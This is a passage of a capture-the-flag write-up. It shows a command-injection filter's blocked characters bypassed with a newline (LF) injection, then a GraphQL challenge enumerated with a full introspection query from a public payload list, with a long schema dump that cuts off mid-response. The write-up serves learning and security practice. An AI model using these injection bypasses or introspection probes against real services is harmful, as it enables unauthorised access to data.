<p>Supposedly they learned their lesson and tried to make this one more secure. Can you prove it is still vulnerable?</p>
</li>
</ul>
</fieldset>
<h3 id="walkthrough-3">Walkthrough</h3>
<p>This challenge provides the same UI as Confidentiality, but the functionality has been changed. The same trick didn&rsquo;t work here.</p>
<p><div class="img-container"><img src="imgs/image-20210917154503521.png" alt="image-20210917154503521"  /></div>
</p>
<p>I tried submitting several characters for command injection, and the following were found to be filtered.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">% | \ &#34; &#39; { } ` $ ( ) &amp; _ 
</span></span></code></pre></div><p>The next thing  I tried was CRLF injection, and it did work with LF (<code>\n</code>).</p>
<p><div class="img-container"><img src="imgs/image-20210917034219286.png" alt="image-20210917034219286.png"  /></div>
</p>
<p>I can just grab the flag.</p>
<p><div class="img-container"><img src="imgs/image-20210917034235319.png" alt="image-20210917034235319"  /></div>
</p>
<h2 id="all-baked-up">All Baked Up</h2>
<p>The walkthrough for this challenge is going to be a bit longer <del>(I might consider separating this)</del> because this is my first encounter with GraphQL, and it was fun 😅.</p>
<fieldset>
<legend>Challenge Information </legend>
<ul>
<li>
<p><strong>Author:</strong> -</p>
</li>
<li>
<p><strong>Category:</strong> Web</p>
</li>
<li>
<p><strong>Difficulty:</strong> Medium</p>
</li>
<li>
<p><strong>Description:</strong></p>
<p>Grandma always knew how to make tried-and-true baked goods, and these recipes prove it!</p>
</li>
</ul>
</fieldset>
<h3 id="walkthrough-4">Walkthrough</h3>
<h4 id="initial-recon">Initial recon</h4>
<p>This challenges hosts a kind of blog about cake.</p>
<p><div class="img-container"><img src="imgs/image-20210917202740803.png" alt="image-20210917202740803"  /></div>
</p>
<p>When observing the network traffic, I see a POST request to a GraphQL endpoint.</p>
<p><div class="img-container"><img src="imgs/image-20210917202816500.png" alt="image-20210917202816500"  /></div>
</p>
<p>To investigate it more, I started Burp Suite and then intercepted a single post POST request to the GraphQL endpoint.</p>
<h4 id="graphql-enum">GraphQL enum</h4>
<p>For a single post request, the body contains the following data.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;operationName&#34;</span><span class="p">:</span><span class="s2">&#34;UserQuery&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;variables&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Strawberry Cake&#34;</span>
</span></span><span class="line"><span class="cl">   <span class="p">},</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query UserQuery($name: String!) { post(name: $name) { id    name image  content author { username __typename } __typename }  }&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>And the returned response is something like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;data&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;post&#34;</span><span class="p">:[</span>
</span></span><span class="line"><span class="cl">         <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;__typename&#34;</span><span class="p">:</span><span class="s2">&#34;Post&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;author&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">               <span class="nt">&#34;__typename&#34;</span><span class="p">:</span><span class="s2">&#34;User&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">               <span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;congon4tor&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;content&#34;</span><span class="p">:</span><span class="s2">&#34;1. Preheat oven to 350°. Line the bottoms of 2 greased 8-in. round baking pans with parchment; grease parchment.\n2. In a large bowl, combine cake mix, gelatin, sugar and flour. Add water, oil and eggs; beat on low speed 30 seconds. Beat on medium 2 minutes. Fold in chopped strawberries. Transfer to prepared pans.\n3. Bake until a toothpick inserted in center comes out clean, 25-30 minutes. Cool in pans 10 minutes before removing to wire racks; remove paper. Cool completely.\n4. For frosting, in a small bowl, beat butter until creamy. Beat in crushed strawberries. Gradually beat in enough confectioners’ sugar to reach desired consistency. Spread frosting between layers and over top and sides of cake.&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;image&#34;</span><span class="p">:</span><span class="s2">&#34;https://www.tasteofhome.com/wp-content/uploads/2018/01/Mamaw-Emily-s-Strawberry-Cake_EXPS_FRBZ19_82745_C01_31_4b-9.jpg?resize=696,696&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Strawberry Cake&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>I found out that the request data can actually be shortened into something like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name: \&#34;Strawberry Cake\&#34;) { id    name image  content author { username __typename } __typename }  }&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="err">or</span> <span class="err">just</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;{ post(name: \&#34;Strawberry Cake\&#34;) { id    name image  content author { username __typename } __typename }  }&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The first thing I tried was querying the DB schema using the following query from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection">PayloadAllTheThings</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}}&#34;</span><span class="p">}</span>
</span></span></code></pre></div><p>The server responded with</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;__schema&#34;</span><span class="p">:{</span><span class="nt">&#34;directives&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Included when true.&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;if&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Directs the executor to include this field or fragment only when the `if` argument is true.&#34;</span><span class="p">,</span><span class="nt">&#34;locations&#34;</span><span class="p">:[</span><span class="s2">&#34;FIELD&#34;</span><span class="p">,</span><span class="s2">&#34;FRAGMENT_SPREAD&#34;</span><span class="p">,</span><span class="s2">&#34;INLINE_FRAGMENT&#34;</span><span class="p">],</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;include&#34;</span><span class="p">},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Skipped when true.&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;if&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Directs the executor to skip this field or fragment when the `if` argument is true.&#34;</span><span class="p">,</span><span class="nt">&#34;locations&#34;</span><span class="p">:[</span><span class="s2">&#34;FIELD&#34;</span><span class="p">,</span><span class="s2">&#34;FRAGMENT_SPREAD&#34;</span><span class="p">,</span><span class="s2">&#34;INLINE_FRAGMENT&#34;</span><span class="p">],</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;skip&#34;</span><span class="p">},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="s2">&#34;\&#34;No longer supported\&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Explains why this element was deprecated, usually also including a suggestion for how to access supported similar data. Formattedin [Markdown](https://daringfireball.net/projects/markdown/).&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;reason&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Marks an element of a GraphQL schema as no longer supported.&#34;</span><span class="p">,</span><span class="nt">&#34;locations&#34;</span><span class="p">:[</span><span class="s2">&#34;FIELD_DEFINITION&#34;</span><span class="p">,</span><span class="s2">&#34;ENUM_VALUE&#34;</span><span class="p">],</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;deprecated&#34;</span><span class="p">}],</span><span class="nt">&#34;mutationType&#34;</span><span class="p">:{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Mutation&#34;</span><span class="p">},</span><span class="nt">&#34;queryType&#34;</span><span class="p">:{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Query&#34;</span><span class="p">},</span><span class="nt">&#34;types&#34;</span><span class="p">:[{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The name of the post&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;post&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Post&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;posts&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Post&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Query&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;password&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;username&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;authenticateUser&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Auth&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;image&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;content&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;createPost&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Post&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;username&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;password&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;createUser&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;User&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Mutation&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A GraphQL Schema defines the capabilities of a GraphQL server. It exposes all available types and directives on the server, as well as the entry points for query, mutation, and subscription operations.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A list of all directives supported by this server.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;directives&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Directive&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}}},{</span><span class="nt">&#34;args&#34;</span><span 